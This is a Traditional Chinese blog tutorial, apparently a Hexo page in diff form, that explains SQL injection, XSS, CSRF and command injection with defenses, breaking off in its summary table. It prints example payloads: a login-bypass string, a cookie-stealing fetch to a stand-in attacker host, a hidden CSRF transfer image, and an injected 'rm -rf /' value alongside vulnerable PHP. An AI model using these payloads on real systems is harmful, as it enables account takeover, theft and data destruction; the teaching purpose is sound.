@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/my-blog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/my-blog/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/my-blog/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/my-blog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/my-blog/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"nivek-yang.github.io","root":"/my-blog/","images":"/my-blog/images","scheme":"Muse","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜尋...","empty":"我們無法找到任何有關 ${query} 的搜索結果","hits_time":"找到 ${hits} 個搜索結果（用時 ${time} 毫秒）","hits":"找到 ${hits} 個搜索結果"}}</script><script src="/my-blog/js/config.js" defer></script>
+
+    <meta name="description" content="當我們精心打造一個網站或應用程式時，就像建築師蓋起一棟美麗的房子。我們專注於它的外觀、功能與使用者體驗。但如果忽略了門窗的鎖，再華麗的房子也可能被輕易闖入。在網路世界裡，這些「鎖」就是資訊安全防護。 本篇文章將帶領大家認識四種最常見、也最基礎的網站安全漏洞：SQL Injection、XSS、CSRF 與 Command Injection。它們就像是數位世界裡的小偷與駭客最愛用的幾把萬能鑰匙。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞">
+<meta property="og:url" content="https://nivek-yang.github.io/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="我的技術部落格">
+<meta property="og:description" content="當我們精心打造一個網站或應用程式時，就像建築師蓋起一棟美麗的房子。我們專注於它的外觀、功能與使用者體驗。但如果忽略了門窗的鎖，再華麗的房子也可能被輕易闖入。在網路世界裡，這些「鎖」就是資訊安全防護。 本篇文章將帶領大家認識四種最常見、也最基礎的網站安全漏洞：SQL Injection、XSS、CSRF 與 Command Injection。它們就像是數位世界裡的小偷與駭客最愛用的幾把萬能鑰匙。">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2025-07-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-31T15:25:40.517Z">
+<meta property="article:author" content="Kaiwii">
+<meta property="article:tag" content="Application Security">
+<meta property="article:tag" content="Cyber Security">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://nivek-yang.github.io/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-TW","comments":true,"permalink":"https://nivek-yang.github.io/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/","path":"2025/07/31/四大網站安全漏洞/","title":"一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞 | 我的技術部落格</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/my-blog/js/utils.js" defer></script><script src="/my-blog/js/motion.js" defer></script><script src="/my-blog/js/sidebar.js" defer></script><script src="/my-blog/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.7.0/mermaid.min.js","integrity":"sha256-4+IKDqhZ/sXjc8Wtl2/MsxI4e0s1KpEVdbEP7V/Lz8U="}}</script>
+  <script src="/my-blog/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/my-blog/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/my-blog/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">我的技術部落格</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">探索程式</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜尋" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/my-blog/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+  </li><li class="menu-item menu-item-archives"><a href="/my-blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>文章<span class="badge">46</span></a>
+  </li><li class="menu-item menu-item-tags"><a href="/my-blog/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>標籤<span class="badge">36</span></a>
+      <ul class="sub-menu">
+  
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Application-Security/">
+        Application Security
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Async/">
+        Async
+        <span class="post-count">(7)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Cache/">
+        Cache
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/CDN/">
+        CDN
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Celery/">
+        Celery
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/CI-CD/">
+        CI/CD
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/CSRF/">
+        CSRF
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Cyber-Security/">
+        Cyber Security
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Database/">
+        Database
+        <span class="post-count">(6)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Distributed-System/">
+        Distributed System
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Django/">
+        Django
+        <span class="post-count">(9)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Environment-Variable/">
+        Environment Variable
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Git/">
+        Git
+        <span class="post-count">(3)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Github-Actions/">
+        Github Actions
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/GitHub-Pages/">
+        GitHub Pages
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Hexo/">
+        Hexo
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/HTMX/">
+        HTMX
+        <span class="post-count">(2)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/JavaScript/">
+        JavaScript
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Load-Balancer/">
+        Load Balancer
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Message-Queue/">
+        Message Queue
+        <span class="post-count">(2)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Nginx/">
+        Nginx
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/PostgreSQL/">
+        PostgreSQL
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Postgresql/">
+        Postgresql
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Pub-Sub/">
+        Pub/Sub
+        <span class="post-count">(2)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Python/">
+        Python
+        <span class="post-count">(14)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Rendering/">
+        Rendering
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Ruff/">
+        Ruff
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/SQL/">
+        SQL
+        <span class="post-count">(3)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/SSE/">
+        SSE
+        <span class="post-count">(2)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/SSL-TLS/">
+        SSL/TLS
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Systems-analysis/">
+        Systems analysis
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Task-Management/">
+        Task Management
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Team-Collaboration/">
+        Team Collaboration
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Version-Control/">
+        Version Control
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/Webhook/">
+        Webhook
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+    <li class="menu-item-child">
+      <a href="/my-blog/tags/%E7%B6%B2%E7%AB%99%E5%BB%BA%E7%BD%AE/">
+        網站建置
+        <span class="post-count">(1)</span>
+      </a>
+    </li>
+  
+</ul>
+    
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E9%BA%BC%E6%98%AF%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text"> 什麼是網站安全漏洞？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-sql-injection-sql-%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A"><span class="nav-number">1.1.</span> <span class="nav-text"> 1. SQL Injection (SQL 資料隱碼攻擊)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-cross-site-scripting-xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A"><span class="nav-number">1.2.</span> <span class="nav-text"> 2. Cross-Site Scripting (XSS, 跨站腳本攻擊)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-cross-site-request-forgery-csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E9%80%A0"><span class="nav-number">1.3.</span> <span class="nav-text"> 3. Cross-Site Request Forgery (CSRF, 跨站請求偽造)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-command-injection-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A"><span class="nav-number">1.4.</span> <span class="nav-text"> 4. Command Injection (命令注入攻擊)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E5%A4%A7%E6%BC%8F%E6%B4%9E%E6%AF%94%E8%BC%83%E7%B8%BD%E7%B5%90"><span class="nav-number">2.</span> <span class="nav-text"> 四大漏洞比較總結</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B8%BD%E7%B5%90"><span class="nav-number">3.</span> <span class="nav-text"> 總結</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Kaiwii</p>
+  <div class="site-description" itemprop="description">分享程式技術</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/my-blog/archives/">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+
+    
+      <div class="site-state-item site-state-tags">
+          <a href="/my-blog/tags/">
+        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-name">標籤</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block post-card">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/07/31/%E5%9B%9B%E5%A4%A7%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/my-blog/images/avatar.gif">
+      <meta itemprop="name" content="Kaiwii">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的技術部落格">
+      <meta itemprop="description" content="分享程式技術">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞 | 我的技術部落格">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一次搞懂 SQL Injection, XSS, CSRF 與 Command Injection 四大網站安全漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">發表於</span>
+      
+
+      <time title="創建時間：2025-07-31 00:00:00 / 修改時間：23:25:40" itemprop="dateCreated datePublished" datetime="2025-07-31T00:00:00+08:00">2025-07-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分類於</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/my-blog/categories/%E6%8A%80%E8%A1%93%E7%AD%86%E8%A8%98/" itemprop="url" rel="index"><span itemprop="name">技術筆記</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>當我們精心打造一個網站或應用程式時，就像建築師蓋起一棟美麗的房子。我們專注於它的外觀、功能與使用者體驗。但如果忽略了門窗的鎖，再華麗的房子也可能被輕易闖入。在網路世界裡，這些「鎖」就是資訊安全防護。</p>
+<p>本篇文章將帶領大家認識四種最常見、也最基礎的網站安全漏洞：SQL Injection、XSS、CSRF 與 Command Injection。它們就像是數位世界裡的小偷與駭客最愛用的幾把萬能鑰匙。</p>
+<h1 id="什麼是網站安全漏洞"><a class="markdownIt-Anchor" href="#什麼是網站安全漏洞"></a> 什麼是網站安全漏洞？</h1>
+<p>網站安全漏洞（Web Security Vulnerability）是指網站應用程式在設計或實作上的缺陷，讓攻擊者有機會執行惡意行為，例如竊取資料、癱瘓服務，或欺騙使用者。</p>
+<p>接下來，我們來逐一說明這四個網站安全漏洞。它們主要屬於「Application Security (應用程式安全)」的範疇，而 Application Security 又是「Cyber Security (資訊安全)」的核心支柱之一。</p>
+<ul>
+<li>
+<p>漏洞的根源：這四種漏洞都源自於應用程式的程式碼撰寫不安全或設計有缺陷。它們不是因為路由器設定錯誤或網路傳輸協定（如 TCP/IP）本身有問題而產生的。</p>
+</li>
+<li>
+<p>攻擊的層級：它們都發生在 OSI 模型的第 7 層——應用層。攻擊者是透過與網站應用程式互動（例如提交表單、點擊連結）來發動攻擊。</p>
+</li>
+</ul>
+<h2 id="1-sql-injection-sql-資料隱碼攻擊"><a class="markdownIt-Anchor" href="#1-sql-injection-sql-資料隱碼攻擊"></a> 1. SQL Injection (SQL 資料隱碼攻擊)</h2>
+<ul>
+<li>
+<p><strong>攻擊原理</strong>：當應用程式需要與資料庫溝通時（例如，使用者登入、查詢商品），它會發送 SQL (Structured Query Language) 指令。如果程式沒有妥善過濾使用者的輸入，攻擊者就可以在輸入欄位中「注入」惡意的 SQL 指令，讓資料庫誤以為這是合法的指令，從而執行一些不該做的事。</p>
+</li>
+<li>
+<p><strong>攻擊情境</strong>：<br />
+想像一個登入表單，原本的 SQL 查詢可能長這樣：</p>
+<pre class="highlight"><code class="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;使用者輸入的帳號&#x27;</span> <span class="hljs-keyword">AND</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;使用者輸入的密碼&#x27;</span>;
+</code></pre>
+<p>如果攻擊者在密碼欄位輸入 <code>' OR '1'='1</code>，整個 SQL 指令就會變成：</p>
+<pre class="highlight"><code class="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;some_user&#x27;</span> <span class="hljs-keyword">AND</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>;
+</code></pre>
+<p>由於 <code>'1'='1'</code> 永遠為真（True），這個查詢條件就相當於「密碼無論如何都正確」，攻擊者因此成功繞過驗證，直接登入系統。更糟的是，他們還可能用來刪除整個資料庫 (<code>DROP TABLE</code>)！</p>
+</li>
+<li>
+<p><strong>防禦策略</strong>：</p>
+<ul>
+<li><strong>參數化查詢 (Parameterized Queries) / 預處理陳述 (Prepared Statements)</strong>：這是最有效的方法。它會先將 SQL 指令的「模板」發送到資料庫，再把使用者的輸入當作「參數」傳入。這樣一來，資料庫就能明確區分「指令」和「資料」，惡意輸入只會被當成純文字資料，無法被執行。</li>
+<li><strong>輸入驗證 (Input Validation)</strong>：檢查使用者輸入的格式是否符合預期（例如，信箱格式、數字格式）。</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-cross-site-scripting-xss-跨站腳本攻擊"><a class="markdownIt-Anchor" href="#2-cross-site-scripting-xss-跨站腳本攻擊"></a> 2. Cross-Site Scripting (XSS, 跨站腳本攻擊)</h2>
+<p>如果說 SQL Injection 攻擊的是「後端資料庫」，那麼 XSS 攻擊的目標就是「前端使用者」。</p>
+<ul>
+<li>
+<p><strong>攻擊原理</strong>：攻擊者將惡意的 JavaScript 腳本注入到一個網站中。當其他使用者瀏覽到含有這段惡意腳本的頁面時，腳本就會在使用者的瀏覽器上執行。</p>
+</li>
+<li>
+<p><strong>攻擊情境</strong>：<br />
+在一個有留言板功能的網站上，攻擊者發表了一篇含有惡意腳本的留言：</p>
+<pre class="highlight"><code class="html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>這是一篇很棒的文章！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+  <span class="hljs-comment">// 這段惡意腳本會竊取你的 cookie 並傳送到攻擊者的伺服器</span>
+  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker-server.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>當下一個訪客（例如你）瀏覽這篇留言時，瀏覽器會毫不懷疑地執行這段 <code>&lt;script&gt;</code>。攻擊者就能輕易偷走你的登入憑證 (Session Cookie)，冒用你的身份進行操作。</p>
+</li>
+<li>
+<p><strong>防禦策略</strong>：</p>
+<ul>
+<li><strong>輸出編碼 (Output Encoding)</strong>：這是防禦 XSS 的關鍵。在將使用者輸入的內容顯示到頁面上之前，必須對特殊字元進行編碼。例如，將 <code>&lt;</code> 轉換成 <code>&amp;lt;</code>，將 <code>&gt;</code> 轉換成 <code>&amp;gt;</code>。如此一來，瀏覽器只會將其當作純文字顯示，而不是執行它。</li>
+<li><strong>內容安全策略 (Content Security Policy, CSP)</strong>：透過設定 HTTP Header，告訴瀏覽器只信任並執行來自指定來源的腳本，有效阻擋非預期的腳本執行。</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-cross-site-request-forgery-csrf-跨站請求偽造"><a class="markdownIt-Anchor" href="#3-cross-site-request-forgery-csrf-跨站請求偽造"></a> 3. Cross-Site Request Forgery (CSRF, 跨站請求偽造)</h2>
+<p>CSRF 是一種非常狡猾的攻擊，它「借用」了你的身份去辦壞事。</p>
+<ul>
+<li>
+<p><strong>攻擊原理</strong>：攻擊者誘騙一個已經登入某網站的使用者，在不知情的情況下，點擊一個惡意連結或載入一個惡意頁面。這個惡意頁面會向使用者已登入的網站發送一個偽造的請求（Request）。由於這個請求是從使用者自己的瀏覽器發出的，且會自動帶上該網站的 Cookie，因此被攻擊的網站會認為這是使用者本人的合法操作。</p>
+</li>
+<li>
+<p><strong>攻擊情境</strong>：</p>
+<ol>
+<li>登入了網路銀行 <code>mybank.com</code>。</li>
+<li>接著，收到一封 Email，標題是「快來看可愛貓咪！」，裡面有一個連結指向 <code>evil-cat-site.com</code>。</li>
+<li>點擊了連結，<code>evil-cat-site.com</code> 的頁面裡藏了一段程式碼，例如一個看不見的圖片：<pre class="highlight"><code class="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://mybank.com/transfer?to=attacker&amp;amount=10000&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span>
+</code></pre>
+</li>
+<li>瀏覽器為了載入這張「圖片」，會向 <code>mybank.com</code> 發出一個轉帳請求，並且自動附上你的登入 Cookie。</li>
+<li>銀行伺服器收到請求，驗證 Cookie 後認為是你本人的操作，於是就把錢轉出去了。整個過程你可能毫無察覺。</li>
+</ol>
+</li>
+<li>
+<p><strong>防禦策略</strong>：</p>
+<ul>
+<li><strong>使用 Anti-CSRF Token</strong>：這是在伺服器端產生一個隨機、無法預測的 Token，並將其放在表單中。當使用者提交表單時，伺服器會驗證這個 Token 是否正確。由於攻擊者在 <code>evil-cat-site.com</code> 上無法得知這個 Token，他偽造的請求就會因為缺少或 Token 錯誤而被拒絕。</li>
+<li><strong>檢查 Referer Header</strong>：檢查請求的來源頁面是否為合法的網域，但此方法可能被繞過。</li>
+<li><strong>使用 SameSite Cookie 屬性</strong>：將 Cookie 設置為 <code>SameSite=Strict</code> 或 <code>SameSite=Lax</code>，可以限制 Cookie 在跨站請求中被發送，是現今瀏覽器的主流防禦方式之一。</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-command-injection-命令注入攻擊"><a class="markdownIt-Anchor" href="#4-command-injection-命令注入攻擊"></a> 4. Command Injection (命令注入攻擊)</h2>
+<p>這種攻擊的危險性與 SQL Injection 不相上下，但它攻擊的目標是「伺服器的作業系統」。</p>
+<ul>
+<li>
+<p><strong>攻擊原理</strong>：當應用程式需要呼叫作業系統的命令（例如 <code>ping</code>、<code>ls</code>、<code>rm</code> 等），且直接將使用者的輸入作為命令的一部分時，攻擊者可以注入額外的系統命令，讓伺服器執行意料之外的操作。</p>
+</li>
+<li>
+<p><strong>攻擊情境</strong>：<br />
+網站提供一個功能，讓使用者可以 PING 一個 IP 位址來檢查網路狀況。後端程式碼可能是這樣的 (以 PHP 為例)：</p>
+<pre class="highlight"><code class="php"><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip_address&#x27;</span>];
+<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span> . <span class="hljs-variable">$ip</span>);
+</code></pre>
+<p>如果攻擊者輸入的 IP 是 <code>8.8.8.8; rm -rf /</code>，那麼在伺服器上執行的命令就會變成：</p>
+<pre class="highlight"><code class="bash">ping -c 4 8.8.8.8; <span class="hljs-built_in">rm</span> -rf /
+</code></pre>
+<p>系統會先執行合法的 PING 指令，然後接著執行 <code>rm -rf /</code>（刪除根目錄下所有檔案）這個毀滅性的指令。</p>
+</li>
+<li>
+<p><strong>防禦策略</strong>：</p>
+<ul>
+<li><strong>避免直接呼叫系統命令</strong>：盡可能使用語言內建的函式庫或 API 來完成功能，而不是拼接字串去呼叫系統命令。這是最安全的做法。</li>
+<li><strong>嚴格的輸入白名單 (Whitelist)</strong>：如果非得使用系統命令，務必建立一個「白名單」，只允許輸入符合特定格式的字元（例如，只允許數字和點 <code>.</code>），過濾掉所有其他特殊字元（如 <code>;</code>, <code>|</code>, <code>&amp;</code> 等）。</li>
+</ul>
+</li>
+</ul>
+<h1 id="四大漏洞比較總結"><a class="markdownIt-Anchor" href="#四大漏洞比較總結"></a> 四大漏洞比較總結</h1>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">漏洞類型</th>
+<th style="text-align:left">攻擊目標</th>
+<th style="text-align:left">攻擊手法簡述</th>
+<th style="text-align:left">主要防禦策略</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>SQL Injection</strong></td>
+<td style="text-align:left">後端資料庫</td>
+<td style="text-align:left">在使用者輸入中注入惡意 SQL 指令，欺騙資料庫執行。</td>
+<td style="text-align:left"><strong>參數化查詢</strong> (Prepared Statements)</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>XSS</strong></td>
+<td style="text-align:left">前端使用者瀏覽器</td>
+<td style="text-align:left">在網頁中注入惡意 JavaScript，在他人瀏覽器上執行。</td>
+<td style="text-align:left"><strong>輸出內容編碼</strong> (Output Encoding)</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>CSRF</strong></td>
+<td style="text-align:left">已登入的使用者</td>
+<td style="text-align:left">誘騙使用者點擊連結，以其身份向伺服器發送偽造請求。</td>
